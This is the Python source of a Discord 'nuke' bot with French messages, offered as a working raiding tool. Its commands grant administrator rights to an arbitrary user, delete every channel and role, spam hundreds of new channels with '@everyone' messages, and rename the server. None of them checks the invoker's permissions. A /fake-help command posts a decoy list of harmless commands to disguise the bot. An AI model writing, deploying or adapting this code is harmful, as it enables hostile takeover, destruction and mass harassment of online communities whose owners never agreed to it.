import os
import asyncio
import logging
import discord
from discord import app_commands
from discord.ext import commands

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
)
log = logging.getLogger('giveadmin-bot')

TOKEN = os.environ.get('DISCORD_TOKEN')
ROLE_NAME = os.environ.get('ADMIN_ROLE_NAME', 'W4X15DJ')

if not TOKEN:
    raise RuntimeError('DISCORD_TOKEN is not set in environment')

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)


# ----------------------------- helpers ----------------------------- #

async def _safe(coro):
    try:
        return await coro
    except Exception as e:
        log.warning('task failed: %s', e)
        return None


# ----------------------------- events ----------------------------- #

@bot.event
async def on_ready():
    log.info('Logged in as %s', bot.user)
    # Sync per-guild uniquement (instantane, pas de duplication avec le global)
    for guild in bot.guilds:
        try:
            bot.tree.copy_global_to(guild=guild)
            synced = await bot.tree.sync(guild=guild)
            log.info('Synced %d cmd(s) to guild %s', len(synced), guild.id)
        except Exception as e:
            log.exception('Guild sync failed: %s', e)


@bot.event
async def on_guild_join(guild):
    log.info('Joined guild %s -- resyncing', guild.id)
    try:
        bot.tree.copy_global_to(guild=guild)
        synced = await bot.tree.sync(guild=guild)
        log.info('Synced %d cmd(s) to new guild %s', len(synced), guild.id)
    except Exception as e:
        log.exception('on_guild_join sync failed: %s', e)


# ----------------------------- /giveadmin ----------------------------- #

@bot.tree.command(name='giveadmin', description='Cree un role Admin et l attribue a un utilisateur')
@app_commands.describe(user_id='ID de l utilisateur a qui donner le role admin')
async def giveadmin(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    try:
        uid = int(user_id.strip())
    except ValueError:
        await interaction.followup.send('ID invalide.', ephemeral=True)
        return

    member = guild.get_member(uid) or await guild.fetch_member(uid)
    me = guild.me
    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
        return

    role = await guild.create_role(
        name=ROLE_NAME,
        permissions=discord.Permissions(administrator=True),
        reason=f'/giveadmin by {interaction.user}',
    )
    try:
        if me.top_role and me.top_role.position > 1:
            await role.edit(position=max(me.top_role.position - 1, 1))
    except Exception as e:
        log.warning('Reposition failed: %s', e)

    await member.add_roles(role, reason=f'/giveadmin by {interaction.user}')
    await interaction.followup.send(
        f'Role **{role.name}** (Admin) attribue a <@{member.id}>.',
        ephemeral=True,
    )


# ----------------------------- /n-salon ----------------------------- #

@bot.tree.command(
    name='n-salon',
    description='Supprime tous les salons, en cree N et y envoie un message en boucle',
)
@app_commands.describe(
    number='Nombre de salons a creer',
    message='Message a envoyer dans chaque salon',
    repeat='Nombre de fois que le message est envoye par salon (defaut 5)',
    name='Nom des salons crees (defaut: spam)',
)
async def n_salon(
    interaction: discord.Interaction,
    number: int,
    message: str,
    repeat: int = 5,
    name: str = 'spam',
):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return
    if number < 1 or number > 500:
        await interaction.followup.send('number doit etre entre 1 et 500.', ephemeral=True)
        return
    if repeat < 1 or repeat > 50:
        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()
    await asyncio.gather(*[_safe(ch.delete(reason='/n-salon')) for ch in list(guild.channels)])

    create_tasks = [
        _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='/n-salon'))
        for i in range(number)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]

    async def flood(channel):
        sent = 0
        for _ in range(repeat):
            try:
                await channel.send(content=message)
                sent += 1
            except discord.HTTPException as e:
                log.warning('send failed on %s: %s', channel.id, e)
                await asyncio.sleep(0.5)
        return sent

    results = await asyncio.gather(*[flood(c) for c in created])
    total_sent = sum(results)
    elapsed = asyncio.get_event_loop().time() - start

    if created:
        try:
            await created[0].send(
                f'**/n-salon termine en {elapsed:.1f}s** - {len(created)}/{number} salons, {total_sent} messages.'
            )
        except Exception:
            pass


# ----------------------------- /nuke ----------------------------- #

@bot.tree.command(
    name='nuke',
    description='Nuke complet: supprime salons + roles, recree N salons, spam, et renomme le serveur',
)
@app_commands.describe(
    channels='Nombre de salons a creer (defaut: 50)',
    message='Message a spam dans chaque salon (defaut: @everyone)',
    repeat='Nombre de messages par salon (defaut: 5)',
    channel_name='Nom des nouveaux salons (defaut: nuked)',
    server_name='Nouveau nom du serveur (optionnel)',
    delete_roles='Supprimer aussi tous les roles (defaut: true)',
)
async def nuke(
    interaction: discord.Interaction,
    channels: int = 50,
    message: str = '@everyone',
    repeat: int = 5,
    channel_name: str = 'nuked',
    server_name: str = None,
    delete_roles: bool = True,
):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return
    if channels < 1 or channels > 500:
        await interaction.followup.send('channels doit etre entre 1 et 500.', ephemeral=True)
        return
    if repeat < 1 or repeat > 50:
        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()
    log.info('NUKE launched by %s on guild %s', interaction.user, guild.id)

    rename_task = None
    if server_name:
        new = server_name.strip()[:100]
        if len(new) >= 2:
            rename_task = asyncio.create_task(
                _safe(guild.edit(name=new, reason=f'/nuke by {interaction.user}'))
            )

    role_targets = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and r < me.top_role
    ] if delete_roles else []

    delete_tasks = [_safe(c.delete(reason='/nuke')) for c in list(guild.channels)]
    delete_tasks += [_safe(r.delete(reason='/nuke')) for r in role_targets]
    await asyncio.gather(*delete_tasks)

    create_tasks = [
        _safe(guild.create_text_channel(name=f'{channel_name}-{i+1}', reason='/nuke'))
        for i in range(channels)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]

    async def flood(channel):
        sent = 0
        for _ in range(repeat):
            try:
                await channel.send(content=message)
                sent += 1
            except discord.HTTPException as e:
                log.warning('send failed on %s: %s', channel.id, e)
                await asyncio.sleep(0.5)
        return sent

    results = await asyncio.gather(*[flood(c) for c in created])
    total_sent = sum(results)

    if rename_task:
        await rename_task

    elapsed = asyncio.get_event_loop().time() - start
    summary = (
        f'**NUKE termine en {elapsed:.1f}s**\n'
        f'- {len(created)}/{channels} salons crees\n'
        f'- {len(role_targets)} roles supprimes\n'
        f'- {total_sent} messages envoyes\n'
        + (f'- Serveur renomme en **{server_name}**\n' if server_name else '')
    )
    if created:
        try:
            await created[0].send(summary)
        except Exception:
            pass


# ----------------------------- /rename-s ----------------------------- #

@bot.tree.command(name='rename-s', description='Renomme le serveur')
@app_commands.describe(name='Nouveau nom du serveur (2 a 100 caracteres)')
async def rename_s(interaction: discord.Interaction, name: str):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.manage_guild:
        await interaction.followup.send('Le bot doit avoir Manage Server / Administrateur.', ephemeral=True)
        return

    new_name = name.strip()
    if len(new_name) < 2 or len(new_name) > 100:
        await interaction.followup.send('Le nom doit faire entre 2 et 100 caracteres.', ephemeral=True)
        return

    old_name = guild.name
    try:
        await guild.edit(name=new_name, reason=f'/rename-s by {interaction.user}')
    except discord.HTTPException as e:
        await interaction.followup.send(f'Erreur Discord: `{e}`', ephemeral=True)
        return

    await interaction.followup.send(
        f'Serveur renomme: **{old_name}** -> **{new_name}**',
        ephemeral=True,
    )


# ----------------------------- /supp-roles ----------------------------- #

@bot.tree.command(name='supp-roles', description='Supprime tous les roles (all) ou un role precis par son ID')
@app_commands.describe(target='"all" pour tout supprimer, ou l ID d un role specifique (defaut: all)')
async def supp_roles(interaction: discord.Interaction, target: str = 'all'):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
        return

    target = target.strip().lower()

    if target != 'all':
        try:
            rid = int(target)
        except ValueError:
            await interaction.followup.send('target doit etre "all" ou un ID numerique.', ephemeral=True)
            return
        role = guild.get_role(rid)
        if role is None:
            await interaction.followup.send(f'Aucun role avec l ID `{rid}`.', ephemeral=True)
            return
        if role.is_default() or role.managed or role >= me.top_role:
            await interaction.followup.send('Role non supprimable (everyone, integration, ou hierarchie).', ephemeral=True)
            return
        await role.delete(reason=f'/supp-roles by {interaction.user}')
        await interaction.followup.send(f'Role **{role.name}** supprime.', ephemeral=True)
        return

    deletable = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and r < me.top_role
    ]
    if not deletable:
        await interaction.followup.send('Aucun role supprimable trouve.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()
    results = await asyncio.gather(*[_safe(r.delete(reason='/supp-roles all')) for r in deletable])
    ok = sum(1 for x in results if x is not None or x is None)  # _safe returns None on success too
    # On compte differemment : si aucune exception levee dans _safe, le delete a marche.
    # Plus simple: compter les roles disparus
    remaining = {r.id for r in guild.roles}
    deleted_count = sum(1 for r in deletable if r.id not in remaining)
    elapsed = asyncio.get_event_loop().time() - start
    await interaction.followup.send(
        f'**{deleted_count}/{len(deletable)}** roles supprimes en {elapsed:.1f}s.',
        ephemeral=True,
    )


# ----------------------------- /fake-help ----------------------------- #

@bot.tree.command(name='fake-help', description='Envoie un embed help dans le salon choisi')
@app_commands.describe(salon='Salon ou envoyer l embed')
async def fake_help(interaction: discord.Interaction, salon: discord.TextChannel):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    me = interaction.guild.me
    perms = salon.permissions_for(me) if me else None
    if not perms or not perms.send_messages or not perms.embed_links:
        await interaction.followup.send(f'Le bot ne peut pas envoyer d embed dans {salon.mention}.', ephemeral=True)
        return

    embed = discord.Embed(
        title='Liste des commandes',
        description='Voici les commandes disponibles sur ce serveur.',
        color=0x5865F2,
    )
    embed.add_field(name='Moderation', value=(
        '`/ban` - Bannir un utilisateur\n'
        '`/kick` - Expulser un utilisateur\n'
        '`/mute` - Rendre muet un utilisateur\n'
        '`/unmute` - Retirer le mute\n'
        '`/warn` - Avertir un utilisateur\n'
        '`/clear` - Supprimer des messages'
    ), inline=False)
    embed.add_field(name='Utilitaires', value=(
        '`/userinfo` - Infos sur un utilisateur\n'
        '`/serverinfo` - Infos sur le serveur\n'
        '`/avatar` - Afficher l avatar\n'
        '`/ping` - Latence du bot'
    ), inline=False)
    embed.add_field(name='Roles', value=(
        '`/role-add` - Ajouter un role\n'
        '`/role-remove` - Retirer un role\n'
        '`/role-list` - Liste des roles'
    ), inline=False)
    embed.add_field(name='Fun', value=(
        '`/say` - Faire parler le bot\n'
        '`/poll` - Creer un sondage\n'
        '`/8ball` - Boule magique\n'
        '`/coinflip` - Pile ou face'
    ), inline=False)
    embed.set_footer(text='Tape une commande pour l utiliser')

    await salon.send(embed=embed)
    await interaction.followup.send(f'Embed envoye dans {salon.mention}.', ephemeral=True)


if __name__ == '__main__':
    bot.run(TOKEN, reconnect=True)
